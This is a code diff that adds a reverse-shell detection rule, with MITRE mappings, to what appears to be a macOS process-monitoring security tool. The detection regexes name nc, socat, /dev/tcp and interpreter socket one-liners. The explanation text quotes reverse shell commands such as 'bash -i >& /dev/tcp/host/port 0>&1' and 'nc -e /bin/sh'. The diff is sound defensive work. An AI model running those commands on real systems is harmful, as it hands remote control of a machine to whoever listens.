@@ -4,7 +4,7 @@ import {
   CURL_SPEC, hasOpt, hasShortFlag, looksLikeUrl, optValues, osascriptArgs, parseOpts, PIPE_LANGS, readsStdin,
   SECURITY_FIND_SPEC, securityArgs, stagingPlace, tarCreates, WGET_SPEC, type PipeLang,
 } from './args';
-import { PASTE_WINDOW_MS, agentRuntime, originalParentImage, siblings, sourcesAgentSnapshot, underAgentShell } from './context';
+import { PASTE_WINDOW_MS, agentRuntime, originalParentImage, siblings, sourcesAgentSnapshot, sshAncestor, underAgentShell } from './context';
 import { COPY_TOOLS, credentialStore, isBrowserEngine } from './credentials';
 import { fileLedger } from './ledger';
 import { INDICATOR_FAMILIES, matchArgs, matchPath, matchPlist, matchSigning, matchTeam, type Indicator } from './indicators';
@@ -580,9 +580,68 @@ function plistBase(plists: string[]): string {
 
 /** The language an exec'd image reads from a piped stdin, or null. */
 export function pipeLang(img: Image): PipeLang | null {
-  if (img.stdinIsPipe !== true || img.script !== null || !img.args) return null;
+  return img.stdinIsPipe === true ? stdinLang(img) : null;
+}
+
+/** The language of a shell or interpreter image that reads its commands from stdin (no script file, no inline code). */
+function stdinLang(img: Image): PipeLang | null {
+  if (img.script !== null || !img.args) return null;
   const lang = PIPE_LANGS.find(([re]) => re.test(basename(img.path)))?.[1];
   return lang && readsStdin(lang, img.args) ? lang : null;
+}
+
+/** A shell or interpreter reading its commands from a socket: what a reverse shell is from the shell's side. */
+const socketLang = (img: Image): PipeLang | null => (img.stdinIsSocket === true ? stdinLang(img) : null);
+
+const SHELL_NAME = /^(?:sh|bash|zsh|dash|ksh|csh|tcsh)$/;
+const DEV_NET = /\/dev\/(?:tcp|udp)\//;
+/** The shell's own output (and errors) sent to the socket: `>& /dev/tcp/…`, `&> /dev/tcp/…`, or input taken from it with `<&`. */
+const DEV_NET_DUP = /(?:>&|&>|<&)\s*\/dev\/(?:tcp|udp)\//;
+/** A descriptor opened read-write on the socket, to be wired to the shell: `exec 5<>/dev/tcp/…`. */
+const DEV_NET_EXEC = /\bexec\s+\d+\s*<>\s*\/dev\/(?:tcp|udp)\//;
+/** A plain redirection to the socket, which only makes a reverse shell together with stdin tied to it (`0>&1`, `0<&1`). */
+const DEV_NET_REDIRECT = /[<>]\s*\/dev\/(?:tcp|udp)\//;
+const STDIN_DUP = /(?:^|[^\d])0\s*[<>]&\s*[12]\b/;
+const NC_NAMES = /^(?:nc|ncat|netcat)$/;
+const INLINE_FLAG: Record<string, string> = { python: 'c', perl: 'eE', ruby: 'e', php: 'r' };
+const INLINE_SOCKET_SHELL = /\b(?:dup2|pty\.spawn|subprocess|exec|system|IO\.popen|popen|spawn)\b|open\(\s*STD(?:IN|OUT)/;
+
+/**
+ * The reverse-shell pattern in this image's command line, as a short label, or null. Matching is on words, never on
+ * the host or port, so a cleaned capture (hosts replaced by placeholders) gives the same answer. A bare `/dev/tcp`
+ * port check (`</dev/tcp/db/5432`) ties no shell to the socket and is not a match.
+ */
+export function reverseShellCommand(img: Image): string | null {
+  const n = basename(img.path);
+  const a = rest(img);
+  if (a.length === 0) return null;
+  if (SHELL_NAME.test(n) && hasShortFlag(a, 'c')) {
+    const script = a.join(' ');
+    if (DEV_NET.test(script) && (DEV_NET_DUP.test(script) || DEV_NET_EXEC.test(script)
+      || (DEV_NET_REDIRECT.test(script) && STDIN_DUP.test(script)))) return '/dev/tcp redirect';
+    if (/\bmk(?:fifo\b|nod\b[^;|&]*\sp\b)/.test(script) && /\b(?:nc|ncat|netcat)\b/.test(script)) return 'fifo + nc';
+    if (/\bzmodload\b[^;|&]*\bzsh\/net\/tcp\b/.test(script) && /\bztcp\b/.test(script)) return 'zsh ztcp';
+    return null;
+  }
+  if (NC_NAMES.test(n)) {
+    // Apple's /usr/bin/nc takes -c for CRLF line endings, so only -e runs a program there.
+    const runs = hasShortFlag(a, 'e') || (n !== 'nc' && hasShortFlag(a, 'c'))
+      || a.some(x => /^--(?:exec|sh-exec)(?:=|$)/.test(x));
+    return runs ? `${n} runs a program` : null;
+  }
+  if (n === 'socat') return a.some(x => /^(?:exec|system):/i.test(x)) ? 'socat exec:' : null;
+  const lang = Object.keys(INLINE_FLAG).find(k => new RegExp(`^${k}[0-9.]*$`).test(n));
+  if (lang !== undefined && [...INLINE_FLAG[lang]!].some(l => hasShortFlag(a, l))) {
+    const code = a.join(' ');
+    if (/socket/i.test(code) && INLINE_SOCKET_SHELL.test(code)) return `${lang} socket + shell`;
+  }
+  return null;
+}
+
+/** MITRE technique of the language a reverse-shell command line runs in. */
+function reverseShellMitre(img: Image): string {
+  const n = basename(img.path);
+  return /^python[0-9.]*$/.test(n) ? 'T1059.006' : /^(?:perl|ruby|php)[0-9.]*$/.test(n) ? 'T1059' : 'T1059.004';
 }
 
 /** openssl digest commands, where -d means debug output rather than decode. */
@@ -901,6 +960,25 @@ export const RULES: Rule[] = [
           ? "A shell ran commands piped into it (the `curl … | bash` pattern), so there's no script file on disk to inspect."
           : `${n} ran a script piped into it (the \`curl … | ${n}\` pattern), so there's no script file on disk to inspect.`,
       };
+    },
+  },
+  {
+    id: 'reverse-shell', title: 'Reverse shell', severity: 'high', levels: ['high', 'med'],
+    explanation: "A shell or interpreter wired to a network connection, so whoever is at the other end types its commands: a reverse shell. Seen two ways: a shell (or python, perl, ruby) reading its commands from a socket, or a command line that sets one up (`bash -i >& /dev/tcp/host/port 0>&1`, `nc -e /bin/sh`, `socat … exec:`, a fifo piped through nc, a python or perl one-liner that connects a socket and hands it to a shell). An `ssh -T` session also gives its shell a socket, so a socket shell under sshd is med.",
+    mitre: ['T1059.004', 'T1059.006', 'T1059', 'T1095'], scope: 'image',
+    match: ({ m, p, img, imgIndex }) => {
+      const lang = socketLang(img);
+      // Once per process: macOS /bin/sh re-execs /bin/bash with the same arguments and the same stdin.
+      const socket = lang !== null && !p.images.slice(0, imgIndex).some(i => !i.inherited && socketLang(i) !== null);
+      const cmd = reverseShellCommand(img);
+      if (!socket && cmd === null) return null;
+      const viaSsh = socket && cmd === null && sshAncestor(m, p);
+      const evidence = [
+        socket ? `${cmdline(img)} reads its commands from a socket${viaSsh ? ' (under sshd: an ssh -T session looks the same)' : ''}` : null,
+        cmd !== null ? `${cmdline(img)} (${cmd})` : null,
+      ].filter(Boolean);
+      const mitre = [...new Set([...(socket ? [lang!.mitre] : []), ...(cmd !== null ? [reverseShellMitre(img)] : []), 'T1095'])].sort();
+      return { evidence: socket && cmd !== null ? `${evidence[0]}; command line: ${cmd}` : evidence[0]!, severity: viaSsh ? 'med' : 'high', mitre };
     },
   },
   {
